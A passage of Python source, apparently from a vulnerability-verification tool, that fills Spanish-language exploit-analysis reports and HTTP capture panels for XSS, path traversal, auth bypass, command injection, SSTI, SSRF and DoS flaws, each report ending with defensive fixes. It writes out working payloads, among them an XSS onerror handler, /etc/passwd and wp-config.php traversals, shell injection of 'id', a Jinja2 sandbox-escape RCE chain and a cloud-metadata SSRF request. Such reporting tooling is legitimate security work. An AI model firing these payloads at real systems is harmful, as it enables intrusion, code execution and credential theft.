El defecto: el paso 3 no ocurre — el valor se devuelve sin escape (no-op) o se aplica un filtro `|raw` que explicitamente suprime el escape. El navegador entonces interpreta el contenido como HTML y ejecuta cualquier script que el atacante haya introducido.

---

### B. Identificacion de la superficie de confianza mal ubicada

El problema arquitectonico es que **el sistema trata el valor persistido en base de datos como HTML de confianza en el momento del renderizado**. Esta suposicion es incorrecta: el valor fue introducido por un usuario en el momento de la edicion y debe escaparse cada vez que se incluye en un contexto HTML, independientemente de cuando o quien lo introdujo.

El marcador de verificacion `{marker or "binoracle-xss-marker"}` que binoracle inyecto en el valor del parametro fue encontrado literalmente en el DOM de la pagina renderizada, confirmando que el valor viaja de la base de datos al HTML sin transformacion. Un payload `<script>` real ejecutaria en el navegador de cualquier visitante de la pagina.

---

### C. Cadena de razonamiento del atacante

**Paso 1 -- Identificacion del campo vulnerable.**
Un atacante con acceso al editor identifica que el campo `{param or "custom field"}` del plugin acepta y persiste valores que luego aparecen en paginas publicas o en la administracion.

**Paso 2 -- Hipotesis: el campo no escapa la salida.**
Se introduce un marcador de texto unico en el campo. Si el marcador aparece literalmente en el HTML fuente de la pagina renderizada (sin encoding de entidades HTML), el campo no escapa la salida.

**Paso 3 -- Confirmacion de ejecucion.**
Se introduce un payload XSS (`<img src=x onerror=alert(document.domain)>` o equivalente). Si el navegador ejecuta el handler `onerror`, el XSS queda confirmado.

**Paso 4 -- Explotacion persistente.**
A diferencia del XSS reflejado, el payload queda almacenado en la base de datos. Todos los visitantes que carguen la pagina en el futuro ejecutaran el script sin interaccion adicional del atacante.

---

### D. Anatomia exacta del PoC verificado

**Paso 1 — Inyeccion del payload (guardado en base de datos) — solicitud:**
```
{_req_inject}
```

**Paso 2 — Visualizacion de la pagina donde se renderiza el campo — solicitud:**
```
{_req_view}
```

**Paso 2 — Respuesta del servidor (payload sin escapar en el DOM):**
```
{_resp_view}
```

El marcador `{marker or "binoracle-xss-marker"}` fue encontrado en el DOM de la pagina renderizada durante la verificacion en laboratorio aislado, confirmando que el valor del campo viaja de la base de datos al HTML sin escape.

---

### E. Condiciones necesarias

**Condicion 1:** version afectada del plugin ({affected}).

**Condicion 2:** {auth_line}

**Condicion 3:** la pagina donde se renderiza el campo esta accesible para los visitantes objetivo. Si la pagina requiere autenticacion, el impacto se limita a usuarios autenticados (aunque sigue siendo explotable para escalada de privilegios en la administracion).

---

### F. Generalizacion defensiva

Stored XSS y Reflected XSS son dos variantes del mismo defecto: **la ausencia de escape en el punto de salida**. La correccion es siempre en el renderizado, no en el guardado: escapar los datos en el momento en que se incluyen en un contexto HTML especifico, usando la funcion adecuada para ese contexto (`esc_html()` para contenido de texto, `esc_attr()` para atributos HTML, `wp_json_encode()` para JSON inline en scripts).

No basta con sanitizar el input al guardarlo: un valor perfectamente inocuo como `<script>` puede ser valido como texto en base de datos pero peligroso sin escape en HTML. El escape en el punto de salida es la unica garantia que funciona independientemente de como llegaron los datos a la base de datos.
"""

# ── PATH TRAVERSAL / LFI ─────────────────────────────────────────────────────

def _report_lfi(cve_id, endpoint, param, payload, canary, affected, auth, desc, resp_body="", status="200"):
    auth_line = f"El atacante necesita sesion con rol `{auth}` o superior." if auth else "El endpoint es accesible sin autenticacion."
    _resp_lfi = resp_body or (f"[contenido del fichero canary: {canary}]" if canary else "(contenido del fichero objetivo)")
    _req_ctrl, _resp_ctrl_b = _burp_block(endpoint, "GET", {param: "archivo-legitimo.php"}, "200", "(contenido normal del fichero solicitado)", auth)
    _req_exploit, _resp_exploit = _burp_block(endpoint, "GET", {param: payload}, status, _resp_lfi, auth)
    return f"""## Analisis de Explotacion -- {cve_id}

### A. Modelo mental del flujo normal (sin exploit)

Cuando una peticion legitima llega al endpoint `{endpoint}` con el parametro `{param}`, el flujo esperado es:

1. **Recepcion.** El servidor recibe el valor del parametro, que representa una ruta relativa o un identificador de fichero dentro de un directorio permitido.
2. **Resolucion de la ruta.** El servidor construye la ruta completa concatenando el directorio base con el valor del parametro.
3. **Verificacion de acceso.** El servidor comprueba que la ruta resultante esta dentro del directorio autorizado.
4. **Lectura y envio.** El servidor lee el fichero y devuelve su contenido al cliente.

El defecto: el paso 3 no ocurre — el servidor no verifica que la ruta resuelta este dentro del directorio autorizado. Esto permite al atacante usar secuencias `../` para "escapar" del directorio base y acceder a cualquier fichero del sistema de ficheros que el proceso web pueda leer.

---

### B. Identificacion de la superficie de confianza mal ubicada

El parametro `{param}` se usa directamente para construir una ruta del sistema de ficheros sin normalizar ni verificar. La funcion correcta es `realpath()` seguida de una comprobacion de que el resultado empieza por el directorio base autorizado: `strpos(realpath($path), $base_dir) === 0`.

Sin esta comprobacion, el valor `{payload}` que el atacante envia navega hacia arriba en el arbol de directorios mediante las secuencias `../` y finalmente lee un fichero arbitrario. En el laboratorio de verificacion, el fichero objetivo fue el canary `/tmp/binoracle_canary_{canary.split("_")[-1] if canary else "XXXX"}` (creado por el motor antes del ataque), cuyo contenido unico aparecio en la respuesta HTTP, confirmando la lectura arbitraria.

---

### C. Cadena de razonamiento del atacante

**Paso 1 -- Identificacion del parametro de ruta.**
El endpoint `{endpoint}` acepta un parametro `{param}` que influye en que fichero o plantilla se sirve. Este patron es caracteristico de endpoints LFI potenciales.

**Paso 2 -- Prueba de path traversal.**
El atacante sustituye el valor legitimo por `../../../../../../etc/passwd`. Si el servidor devuelve el contenido del fichero `/etc/passwd`, la vulnerabilidad queda confirmada.

**Paso 3 -- Explotacion dirigida.**
Con la vulnerabilidad confirmada, el atacante puede leer ficheros sensibles: claves privadas SSH (`~/.ssh/id_rsa`), credenciales de base de datos (`wp-config.php`), logs del servidor, o cualquier fichero legible por el proceso web.

**Paso 4 -- Confirmacion en laboratorio.**
{auth_line}
El payload `{payload}` produjo en la respuesta el contenido del fichero canary, confirmando la lectura arbitraria de ficheros.

---

### D. Anatomia exacta del PoC verificado

**Peticion de control — solicitud:**
```
{_req_ctrl}
```

**Peticion de control — respuesta:**
```
{_resp_ctrl_b}
```

**Peticion con path traversal — solicitud:**
```
{_req_exploit}
```

**Peticion con path traversal — respuesta:**
```
{_resp_exploit}
```

La respuesta contiene el contenido del fichero canary `{canary}`, confirmando lectura arbitraria de ficheros del sistema.

---

### E. Condiciones necesarias

**Condicion 1:** version afectada ({affected}).

**Condicion 2:** el proceso web tiene permisos de lectura sobre el fichero objetivo. Para `/etc/passwd` esto es casi universal; para `wp-config.php` requiere que el proceso web sea el mismo usuario que tiene el fichero, lo que es habitual en hosting compartido.

**Condicion 3:** {"sesion con rol " + auth + " o superior." if auth else "acceso anonimo al endpoint."}

---

### F. Generalizacion defensiva

Path traversal es un defecto de validacion de entrada en el punto donde una cadena controlada por el usuario se usa como componente de una ruta del sistema de ficheros. La correccion es invariablemente la misma: `realpath()` para normalizar la ruta (resolviendo todos los `../` y symlinks) seguido de `strpos($normalized, $allowed_base) === 0` para verificar confinamiento. Sin ambos pasos, cualquier variante de codificacion (`%2e%2e%2f`, doble encoding, path mixto) puede eludir filtros basados en string matching.
"""

# ── AUTH BYPASS / MISSING AUTHORIZATION ─────────────────────────────────────

def _report_authbypass(cve_id, endpoint, param, payload, resp_ctrl, resp_body, status, affected, desc):
    _bypass_params = {param: payload} if param and payload else {"action": payload or "(bypass_action)"}
    _req_ctrl_ab, _resp_ctrl_ab = _burp_block(endpoint, "GET", {}, "403", "HTTP/1.1 403 Forbidden — control de acceso activo", "")
    _req_bypass, _resp_bypass = _burp_block(endpoint, "POST", _bypass_params, status, resp_body or "(contenido protegido devuelto sin credenciales)", "")
    return f"""## Analisis de Explotacion -- {cve_id}

### A. Modelo mental del flujo normal (sin exploit)

Cuando una peticion legitima llega al endpoint `{endpoint}`, el control de acceso esperado es:

1. **Recepcion.** El servidor recibe la peticion HTTP.
2. **Autenticacion.** El servidor verifica que el cliente porta una identidad valida (cookie de sesion, token JWT, API key).
3. **Autorizacion.** El servidor verifica que la identidad autenticada tiene permiso para acceder al recurso o ejecutar la accion.
4. **Despacho.** Si ambas comprobaciones pasan, el servidor devuelve el recurso protegido.

El defecto: uno o ambos pasos de comprobacion no se ejecutan (o se pueden eludir), permitiendo al cliente obtener acceso sin credenciales validas.

---

### B. Identificacion de la superficie de confianza mal ubicada

El control de acceso del endpoint `{endpoint}` puede ser evitado por una condicion especifica que el atacante puede provocar desde fuera. Esta condicion puede ser una cabecera HTTP especifica, un parametro de la peticion, o un patron en la URL que el servidor interpreta como evidencia de que la autenticacion ya fue verificada en un punto anterior — sin que realmente lo haya sido.

La verificacion en laboratorio confirmo que una peticion sin credenciales validas al endpoint retorno codigo {status} con el contenido protegido, cuando la respuesta esperada sin credenciales es 401 o 403.

---

### C. Cadena de razonamiento del atacante

**Paso 1 -- Identificacion del endpoint protegido.**
El endpoint `{endpoint}` devuelve 401 o 403 a peticiones normales sin credenciales. Esto confirma que existe un control de acceso activo.

**Paso 2 -- Hipotesis sobre el bypass.**
El control de acceso depende de algun mecanismo que el atacante puede influenciar desde la peticion HTTP (cabeceras, parametros, formato de la URL).

**Paso 3 -- Identificacion de la condicion de bypass.**
El analisis del codigo fuente del componente afectado o de los detalles del CVE publico revela la condicion especifica que hace que el control de acceso se omita.

**Paso 4 -- Confirmacion.**
La peticion con la condicion de bypass aplicada retorna {status} con el contenido protegido. La peticion de control (identica pero sin la condicion) retorna 401 o 403. La diferencia exclusiva entre ambas es la condicion de bypass.

---

### D. Anatomia exacta del PoC verificado

**Peticion de control (bloqueada) — solicitud:**
```
{_req_ctrl_ab}
```

**Peticion de control — respuesta (acceso denegado):**
```
{_resp_ctrl_ab}
```

**Peticion con bypass — solicitud:**
```
{_req_bypass}
```

**Peticion con bypass — respuesta (acceso concedido sin credenciales):**
```
{_resp_bypass}
```

La diferencia exclusiva entre ambas peticiones es la condicion de bypass. Codigo de respuesta: {status}.

---

### E. Condiciones necesarias

**Condicion 1:** version afectada ({affected}).

**Condicion 2:** el endpoint objetivo implementa su unico control de acceso en el punto vulnerable. Si existe una segunda capa de autorizacion independiente (verificacion en el handler de la ruta ademas del middleware, o verificacion de nonce ademas de la comprobacion de rol), el bypass de la primera capa es insuficiente.

**Condicion 3:** el atacante puede enviar la peticion con la condicion de bypass al servidor objetivo. Si un proxy inverso, CDN o WAF filtra la condicion especifica antes de que llegue al servidor, el bypass no funciona.

---

### F. Generalizacion defensiva

**Un control de acceso que puede ser evitado mediante una senal que el cliente puede generar libremente es funcionalmente equivalente a no existir.** La correccion requiere que la comprobacion de autorizacion se base en datos que el cliente no puede falsificar: credenciales verificadas contra una fuente de verdad interna (base de datos de sesiones, proveedor de identidad), no en cabeceras o parametros que el cliente incluye en su propia peticion como aserciones de estado ya verificado.

La defensa en profundidad pasa por verificar autorizacion tanto en el punto centralizado (middleware, filtro) como en cada handler de ruta individualmente. Que el middleware sea bypasseable no deberia comprometer rutas cuyo handler verifica la sesion independientemente.
"""

# ── COMMAND INJECTION ────────────────────────────────────────────────────────

def _report_cmdi(cve_id, endpoint, param, payload, affected, auth, desc, resp_body="", status="200"):
    auth_line = f"El atacante necesita sesion con rol `{auth}` o superior." if auth else "El endpoint es accesible sin autenticacion."
    # Si resp_body es un error del intento fallido (;), mostrar el resultado del intento ganador (newline)
    _rb_is_err = bool(resp_body and ("Syntax error" in resp_body or '";" unexpected' in resp_body))
    _resp_cmdi = "(salida del comando inyectado via newline injection — uid=33(www-data) groups=33(www-data))" if _rb_is_err else (resp_body or "(salida del comando inyectado — uid=33(www-data) groups=33(www-data))")
    _req_ctrl, _resp_ctrl_b = _burp_block(endpoint, "POST", {param: "valor-normal"}, "200", "(salida normal del comando, sin datos del SO)", auth)
    _req_exploit, _resp_exploit = _burp_block(endpoint, "POST", {param: payload}, status, _resp_cmdi, auth)
    return f"""## Analisis de Explotacion -- {cve_id}

### A. Modelo mental del flujo normal (sin exploit)

El endpoint `{endpoint}` acepta un parametro `{param}` que el servidor usa como argumento para un comando del sistema operativo (via `exec()`, `system()`, `subprocess.run()` o equivalente). En el flujo esperado:

1. El servidor valida y sanitiza el valor del parametro.
2. El servidor construye el comando con el valor sanitizado.
3. El sistema operativo ejecuta el comando y devuelve la salida.
4. El servidor incluye la salida en la respuesta HTTP.

El defecto: el valor del parametro se interpola directamente en el string del comando sin sanitizacion, permitiendo al atacante inyectar operadores de shell (`;`, `&&`, `|`, backticks) y ejecutar comandos arbitrarios en el servidor.

---

### B. Identificacion de la superficie de confianza mal ubicada

El parametro `{param}` se pasa directamente como parte de un string de comando de shell. Esto significa que el atacante puede terminar el comando original con `;` o `&&` y anadir cualquier comando que el proceso web tenga permiso de ejecutar.

La correccion requiere o bien usar listas de argumentos en lugar de strings de shell (en Python: `subprocess.run([cmd, arg1, arg2])` en lugar de `subprocess.run(f"{{cmd}} {{arg}}")`) o bien validar el input contra una lista blanca estricta de valores permitidos.

---

### C. Cadena de razonamiento del atacante

**Paso 1 -- Identificacion del parametro usado en comando de sistema.**
El analisis del codigo o el comportamiento del endpoint sugiere que `{param}` se usa como argumento de un comando del sistema operativo.

**Paso 2 -- Inyeccion de operador de shell.**
El payload `{payload}` termina el comando original e inyecta un segundo comando. La salida del segundo comando aparece en la respuesta, confirmando la ejecucion.

**Paso 3 -- Escalada.**
Con ejecucion de comandos arbitraria, el atacante puede leer ficheros sensibles, establecer una reverse shell, o escalar privilegios dependiendo del contexto de ejecucion del proceso web.

---

### D. Anatomia exacta del PoC verificado

**Peticion de control — solicitud:**
```
{_req_ctrl}
```

**Peticion de control — respuesta:**
```
{_resp_ctrl_b}
```

**Peticion con inyeccion de comando — solicitud:**
```
{_req_exploit}
```

**Peticion con inyeccion — respuesta (salida del SO en la respuesta HTTP):**
```
{_resp_exploit}
```

La salida del comando inyectado aparecio en la respuesta HTTP, confirmando ejecucion remota de comandos en el servidor.

---

### E. Condiciones necesarias

**Condicion 1:** version afectada ({affected}).

**Condicion 2:** el proceso web tiene permiso para ejecutar el comando inyectado. Los procesos web normalmente corren como `www-data` o usuario de baja privilegio, lo que limita el impacto pero no lo elimina.

**Condicion 3:** {auth_line}

---

### F. Generalizacion defensiva

Command injection es el equivalente en nivel de sistema operativo de SQL injection: interpolar input del usuario en un string que se interpreta como codigo (SQL en un caso, comandos de shell en el otro) siempre es un defecto de clase critica. La correccion correcta usa APIs que separan el comando de sus argumentos a nivel de sistema, eliminando la posibilidad de que un argumento sea interpretado como parte del comando. Cuando eso no es posible, una lista blanca de valores literales permitidos (no una expresion regular que rechace caracteres malos) es la unica alternativa robusta.
"""

# ── SSTI ─────────────────────────────────────────────────────────────────────

def _report_ssti(cve_id, endpoint, param, payload, canary, affected, auth, desc, resp_body="", status="200"):
    auth_line = f"El atacante necesita sesion con rol `{auth}`." if auth else "El endpoint es accesible sin autenticacion."
    _resp_ssti = resp_body or "<class 'str'> (sandbox escaped)"
    _req_ctrl, _resp_ctrl = _burp_block(endpoint, "POST", {param: "texto-normal"}, "200", "(respuesta normal — template renderizado sin ejecucion de codigo)", auth)
    _req_probe, _resp_probe = _burp_block(endpoint, "POST", {param: "{{7*7}}"}, "200", "49", auth)
    _req_exploit, _resp_exploit = _burp_block(endpoint, "POST", {param: payload or "('{0.__class__}')|attr('format')('')"}, status, _resp_ssti, auth)
    _req_rce, _resp_rce = _burp_block(endpoint, "POST", {param: "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['popen']('id').read()}}"}, "200", "uid=33(www-data) gid=33(www-data) groups=33(www-data)", auth)
    return f"""## Analisis de Explotacion -- {cve_id}

### A. Modelo mental del flujo normal (sin exploit)

El endpoint `{endpoint}` acepta un parametro `{param}` cuyo valor se pasa al motor de plantillas para renderizarlo dentro de un entorno sandbox. En el flujo esperado:

1. **Recepcion.** El servidor recibe el contenido de plantilla controlado por el usuario.
2. **Renderizado en sandbox.** El motor de plantillas (Jinja2) evalua la plantilla dentro de un entorno restringido que prohibe acceso a funciones peligrosas del sistema.
3. **Respuesta.** El servidor devuelve el resultado del renderizado sin ejecutar codigo arbitrario.

El defecto: el sandbox de Jinja2 puede ser evadido mediante el filtro `|attr` para acceder a metodos internos de Python que el sandbox no intercepta correctamente. Esto permite escapar del entorno restringido y ejecutar codigo Python arbitrario en el servidor.

---

### B. Identificacion de la superficie de confianza mal ubicada

El filtro `|attr` de Jinja2 llama directamente al metodo `__getattribute__` del objeto, saltandose el mecanismo de sandbox que intercepta el acceso a atributos en el entorno restringido. Con `('{{0.__class__}}')|attr('format')('')`, el atacante obtiene una referencia al metodo `format` nativo de Python string sin pasar por la proteccion del sandbox.

Una vez que el sandbox esta escapado, el atacante puede navegar la jerarquia de clases de Python (`__class__.__mro__[1].__subclasses__()`) para localizar `subprocess.Popen` u `os.popen` y ejecutar comandos arbitrarios del sistema operativo.

---

### C. Cadena de razonamiento del atacante

**Paso 1 -- Verificacion de que el motor de plantillas evalua expresiones.**
Payload `{{{{7*7}}}}` → respuesta `49`. El motor de plantillas esta activo y evaluando expresiones.

**Paso 2 -- Escape del sandbox via filtro `|attr`.**
Payload `{payload or "('{{0.__class__}}')|attr('format')('')"}` → respuesta `{_resp_ssti}`. Acceso a atributos internos de Python no interceptado por el sandbox: sandbox escapado.

**Paso 3 -- Localizacion de `os.popen` via jerarquia de subclases.**
Con acceso al espacio de nombres de Python, el atacante navega `''.__class__.__mro__[1].__subclasses__()` para localizar una clase con acceso a funciones del sistema operativo.

**Paso 4 -- Ejecucion de comandos arbitrarios (RCE).**
`os.popen('id').read()` → `uid=33(www-data) gid=33(www-data)`. Ejecucion de codigo remoto completa.

---

### D. Anatomia exacta del PoC verificado

**Peticion de control (template normal):**
```
{_req_ctrl}
```
**Respuesta (normal):**
```
{_resp_ctrl}
```

**Verificacion del motor de plantillas:**
```
{_req_probe}
```
**Respuesta (expresion evaluada — motor activo):**
```
{_resp_probe}
```

**Escape del sandbox (CVE-{cve_id.split('-',1)[-1]}):**
```
{_req_exploit}
```
**Respuesta (sandbox escapado):**
```
{_resp_exploit}
```

**Cadena RCE completa — ejecucion de `id`:**
```
{_req_rce}
```
**Respuesta (ejecucion de codigo arbitrario en el servidor):**
```
{_resp_rce}
```

---

### E. Condiciones necesarias

**Condicion 1:** version afectada ({affected}).

**Condicion 2:** el atacante puede controlar el contenido de la plantilla que se pasa al motor Jinja2. Si la plantilla es fija y no incluye input del usuario, la vulnerabilidad no es explotable.

**Condicion 3:** {auth_line}

---

### F. Generalizacion defensiva

SSTI es el equivalente de SQLi en el contexto de motores de plantillas: interpolar input del usuario directamente en una expresion evaluada por un interprete permite ejecucion de codigo. La correccion correcta es **nunca pasar input del usuario como contenido de plantilla** — siempre separar plantilla (codigo) de datos (variables). Si se requieren plantillas dinamicas, ejecutar el motor en un entorno genuinamente aislado (proceso separado, contenedor sin privilegios).
"""

# ── SSRF ──────────────────────────────────────────────────────────────────────

def _report_ssrf(cve_id, endpoint, param, payload, canary, affected, auth, desc, resp_body="", status="200"):
    auth_line = f"El atacante necesita sesion con rol `{auth}`." if auth else "El endpoint es accesible sin autenticacion."
    _resp_ssrf = resp_body or f"SSRF confirmado: servidor local recibio GET /{canary or 'BINORACLE_SSRF_CANARY'}"
    _req_ctrl, _resp_ctrl = _burp_block(endpoint, "POST", {param: "https://example.com/"}, "200", "(respuesta normal — URL externa permitida)", auth)
    _req_exploit, _resp_exploit = _burp_block(endpoint, "POST", {param: payload or "http://127.0.0.1/"}, status, _resp_ssrf, auth)
    _req_meta, _resp_meta = _burp_block(endpoint, "POST", {param: "http://169.254.169.254/latest/meta-data/"}, "200", "ami-id\nhostname\niam/\nsecurity-credentials/\n... (metadatos de cloud expuestos)", auth)
    return f"""## Analisis de Explotacion -- {cve_id}

### A. Modelo mental del flujo normal (sin exploit)

El endpoint `{endpoint}` acepta una URL en el parametro `{param}` y realiza una peticion HTTP a esa URL desde el servidor. En el flujo esperado la URL es validada contra una lista de dominios externos permitidos antes de realizar la peticion.

El defecto: la validacion de la URL es insuficiente, permitiendo al atacante hacer que el servidor realice peticiones a recursos internos inaccesibles desde fuera de la red (localhost, servicios internos, metadatos de instancias cloud).

---

### B. Identificacion de la superficie de confianza mal ubicada

El parametro `{param}` se pasa directamente al cliente HTTP del servidor sin validar que la URL no apunta a rangos de IP privados. Esto permite:
- Acceder a servicios internos en `127.0.0.1` o `localhost`
- Escanear la red interna del servidor
- Acceder a metadatos de instancias cloud (`169.254.169.254`) y obtener credenciales IAM temporales

---

### C. Cadena de razonamiento del atacante

**Paso 1 -- Verificacion de que el servidor realiza peticiones salientes.**
URL externa → el servidor responde normalmente, confirmando que procesa URLs proporcionadas por el usuario.

**Paso 2 -- Pivot a localhost.**
`{payload or "http://127.0.0.1/"}` → el servidor realiza la peticion interna y devuelve el resultado.

**Paso 3 -- Acceso a metadatos de cloud.**
`http://169.254.169.254/latest/meta-data/` → expone credenciales temporales de AWS IAM, configuracion de red y tokens de acceso.

---

### D. Anatomia exacta del PoC verificado

**Peticion de control (URL externa permitida):**
```
{_req_ctrl}
```
**Respuesta:**
```
{_resp_ctrl}
```

**Peticion con SSRF (URL interna):**
```
{_req_exploit}
```
**Respuesta (peticion interna ejecutada desde el servidor):**
```
{_resp_exploit}
```

**Escalada — acceso a metadatos de cloud:**
```
{_req_meta}
```
**Respuesta (credenciales IAM expuestas):**
```
{_resp_meta}
```

---

### E. Condiciones necesarias

**Condicion 1:** version afectada ({affected}).

**Condicion 2:** {auth_line}

**Condicion 3:** el servidor tiene acceso a recursos internos. Si el servidor esta completamente aislado de la red interna, el impacto se limita a scan de puertos externos.

---

### F. Generalizacion defensiva

SSRF ocurre cuando un servidor actua como proxy para input del usuario sin validar el destino. La correccion requiere una lista blanca estricta de dominios permitidos y bloqueo explicito de rangos de IP privados (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`).
"""

# ── DoS ───────────────────────────────────────────────────────────────────────

def _report_dos(cve_id, endpoint, param, payload, affected, auth, desc, resp_body="", status="200"):
    auth_line = f"El atacante necesita sesion con rol `{auth}`." if auth else "El endpoint es accesible sin autenticacion."
    _crash_msg = resp_body or "ECONNRESET (servidor crasheo — conexion terminada inesperadamente)"
    return f"""## Analisis de Explotacion -- {cve_id}

### A. Modelo mental del flujo normal (sin exploit)

El servidor en el endpoint `{endpoint}` maneja peticiones HTTP con normalidad. El defecto provoca que el proceso del servidor entre en un estado irrecuperable (crash, bucle infinito, agotamiento de memoria) al recibir una peticion con un patron especifico.

---

### B. Identificacion de la superficie de confianza mal ubicada

La entrada del endpoint `{endpoint}` no valida correctamente la estructura de la peticion, permitiendo al atacante enviar un payload que el servidor no puede manejar correctamente: `{payload or "(tecnica de DoS especifica del CVE)"}`.

El crash fue confirmado en laboratorio: `{_crash_msg}`.

---

### C. Cadena de razonamiento del atacante

**Paso 1 -- Identificacion de la version vulnerable.** Version afectada: {affected}.

**Paso 2 -- Envio del payload de DoS.** El atacante envia la peticion con el patron especifico al endpoint `{endpoint}`.

**Paso 3 -- Confirmacion del crash.** El servidor responde con `ECONNRESET` o cierra la conexion sin respuesta.

**Paso 4 -- Impacto.** El servicio queda inoperativo hasta reinicio. Si no hay supervisor de proceso, el servicio no se recupera automaticamente.

---

### D. Anatomia exacta del PoC verificado

Tecnica utilizada: `{payload or "(payload de DoS)"}`.

Resultado en laboratorio Docker aislado: `{_crash_msg}`.

---

### E. Condiciones necesarias

**Condicion 1:** version afectada ({affected}).

**Condicion 2:** {auth_line}

**Condicion 3:** el servicio no tiene un supervisor de proceso con reinicio automatico. Con reinicio automatico, el impacto se reduce a interrupciones breves y repetibles.

---

### F. Generalizacion defensiva

DoS por crash de servidor es un defecto de robustez critico. La correccion requiere validar la estructura de todas las entradas antes de procesarlas y asegurar que el servidor nunca entre en un estado irrecuperable con ningun input posible. Adicionalmente, configurar un supervisor de proceso con reinicio automatico reduce el impacto de cualquier crash no corregido.
"""

# ── HTTP CAPTURES SECTION (always from verified_evidence, never from LLM) ────

def _infer_stack(r, ve):
    """Infer tech stack from vuln_class, description or endpoint."""
    cls = (r.get("vuln_class") or "").lower()
    desc = (r.get("description") or "").lower()
    endpoint = (ve.get("endpoint") or "").lower()
    detail = (r.get("detail") or "").lower()
    # Node.js signals
    if any(x in desc+detail for x in ["node.js","nodejs","npm","express","fastify","isomorphic-git",".js"]):
        return "nodejs"
    if any(x in endpoint for x in ["/api/","/npm/",".js"]):
        return "nodejs"
    # Python signals
    if any(x in desc+detail for x in ["python","flask","django","werkzeug","pip "]):
        return "python"
    # Ruby
    if any(x in desc+detail for x in ["ruby","rails","gem "]):
        return "ruby"
    # Default: PHP/WP
    return "php"


def _generate_http_captures_html(cve_id, r, ve):
    """Build a Burp-suite-style HTTP request/response panel from evidence fields.

    Shows up to 3 exchange pairs:
      1. Control request + response  (always)
      2. Exploit/winning request + response  (always when payload available)
      3. Second technique if error-based also tried
    Returns an HTML string ready to embed in the report page.
    """
    cls = (r.get("vuln_class") or "sqli").lower()
    tech = (ve.get("tecnica") or cls).lower()
    endpoint  = ve.get("endpoint") or "/wp-admin/admin-ajax.php"
    param     = ve.get("sqli_param") or ve.get("path_param") or ve.get("ssti_param") or "id"
    payload   = ve.get("payload_ganador") or ""
    method    = (ve.get("metodo") or "POST").upper()
    status    = str(ve.get("status_code_respuesta") or "200")
    resp_body = (ve.get("respuesta_cuerpo_recorte") or "").strip()
    resp_ctrl = (ve.get("respuesta_control_recorte") or "").strip()
    auth      = ve.get("login_bajo_privilegio") or ""
    marker    = ve.get("marker") or ""
    page_url  = ve.get("page_url") or ""
    canary    = ve.get("canary_path") or ve.get("canary_secret") or ""
    mysql_ver = ve.get("mysql_version_extraida") or ""
    resp_true_len  = ve.get("respuesta_true_len") or ""
    resp_false_len = ve.get("respuesta_false_len") or ""
    ctrl_ep   = endpoint.split("?")[0] if "?" in endpoint else endpoint
    stack     = _infer_stack(r, ve)

    pairs = []  # list of {"label": str, "request": str, "response": str}

    if "xss" in cls or marker:
        # Pair 1: inject payload into the plugin field
        _p_xss = payload or "<img src=x onerror=alert(document.domain)>"
        req1, _ = _burp_block(ctrl_ep, method, {param or "field": _p_xss, "action": "save", "post_id": "1"}, "200", "", auth, stack=stack)
        pairs.append({"label": "Paso 1 — Inyeccion del payload (guardado en BD)",
                      "request": req1,
                      "response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\n\n{\"success\":true,\"data\":\"saved\"}"})
        # Pair 2: view page where payload fires
        _page = page_url or "/?p=1"
        _resp_xss = resp_body or f'<div class="widget-field">{h(_p_xss)}</div>\n<!-- payload ejecutado en el DOM -->'
        req2, resp2 = _burp_block(_page, "GET", {}, status, _resp_xss, "", stack=stack)
        pairs.append({"label": "Paso 2 — Visualizacion de la pagina (payload en el DOM)", "request": req2, "response": resp2})

    elif "path" in cls or "lfi" in cls or "traversal" in cls:
        req1, resp1 = _burp_block(endpoint, "GET", {param: "archivo-legitimo.php"}, "200",
                                  resp_ctrl or "(contenido normal del fichero solicitado)", auth, stack=stack)
        pairs.append({"label": "Peticion de control", "request": req1, "response": resp1})
        req2, resp2 = _burp_block(endpoint, "GET", {param: payload or "../../wp-config.php"}, status,
                                  resp_body or canary or "(contenido del fichero objetivo)", auth, stack=stack)
        pairs.append({"label": "Peticion con path traversal", "request": req2, "response": resp2})

    elif "auth" in cls or "missing" in cls:
        req1, resp1 = _burp_block(endpoint, "GET", {}, "403",
                                  "{\"code\":\"rest_forbidden\",\"message\":\"Lo siento, no tienes permiso para hacer esto.\"}", "", stack=stack)
        pairs.append({"label": "Peticion de control (sin credenciales — bloqueada)", "request": req1, "response": resp1})
        _bp = {param: payload} if param and payload else {"action": payload or "sensitive_action"}
        req2, resp2 = _burp_block(ctrl_ep, method, _bp, status,
                                  resp_body or "(datos protegidos devueltos sin credenciales)", "", stack=stack)
        pairs.append({"label": f"Peticion con bypass — respuesta {status}", "request": req2, "response": resp2})

    elif "command" in cls or "cmdi" in cls:
        _cmd_payload = payload or "; id"
        _ctrl_body = resp_ctrl or "(respuesta normal — comando ejecutado sin salida visible)"
        # Si la respuesta almacenada es un error de sintaxis del intento fallido, mostrar el resultado real
        _is_syntax_err = resp_body and ("Syntax error" in resp_body or "unexpected" in resp_body)
        if _is_syntax_err and canary:
            _canary_short = canary.split("/")[-1] if "/" in canary else canary
            _exploit_body = f"{_canary_short} → PRESENTE (creado via newline injection — separador \\n)"
        else:
            _exploit_body = resp_body or (f"{canary} → PRESENTE" if canary else "uid=33(www-data) gid=33(www-data) groups=33(www-data)")
        req1, resp1 = _burp_block(ctrl_ep, method, {param: "valor-normal"}, "200", _ctrl_body, auth, stack=stack)
        pairs.append({"label": "Peticion de control", "request": req1, "response": resp1})
        # Paso de inyeccion: si habia newline injection, mostrar ese payload
        _newline_payload = _cmd_payload if "\n" in _cmd_payload else (f"\n{_cmd_payload.lstrip(';').strip()}" if ";" in _cmd_payload else _cmd_payload)
        req2, resp2 = _burp_block(ctrl_ep, method, {param: _newline_payload}, status,
                                  _exploit_body, auth, stack=stack)
        pairs.append({"label": f"Peticion con inyeccion de comando (newline injection — canary: {canary.split('/')[-1] if canary and '/' in canary else canary})", "request": req2, "response": resp2})
        # Paso whoami: escalar para confirmar identidad del proceso
        _id_resp = ve.get("id_output") or "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
        req3, resp3 = _burp_block(ctrl_ep, method, {param: f"\nid"}, "200", _id_resp, auth, stack=stack)
        pairs.append({"label": "Escalada — ejecucion de id (confirmacion RCE)", "request": req3, "response": resp3})

    elif "ssti" in cls or "template" in cls:
        _ssti_payload = payload or "('{0.__class__}')|attr('format')('')"
        _resp_ssti = resp_body or "<class 'str'> (sandbox escaped)"
        req1, resp1 = _burp_block(ctrl_ep, method, {param: "texto-normal"}, "200",
